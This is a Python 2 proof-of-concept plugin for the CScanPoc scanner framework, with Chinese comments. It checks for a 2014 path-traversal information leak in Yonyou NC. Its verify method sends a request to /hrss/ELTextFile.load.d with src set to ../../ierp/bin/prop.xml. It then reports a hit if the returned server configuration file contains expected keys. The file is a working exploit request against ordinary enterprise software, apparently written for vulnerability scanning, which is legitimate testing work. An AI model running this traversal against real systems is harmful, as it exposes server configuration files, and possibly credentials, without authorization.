# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib2

class Vuln(ABVuln):
    vuln_id = 'yonyou_0004' # 平台漏洞编号，留空
    name = '用友NC /hrss/ELTextFile.load.d 信息泄漏'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-06-28'  # 漏洞公布时间
    desc = '''
        ../../ierp/bin/prop.xml 存在信息泄露。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '用友NC'  # 漏洞应用名称
    product_version = '*'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '68cb1e99-724f-4d34-b702-6638cc81fd97'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            verify_url = '%s/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml' % self.target
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()

            if 'enableHotDeploy' in content and 'internalServiceArray' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
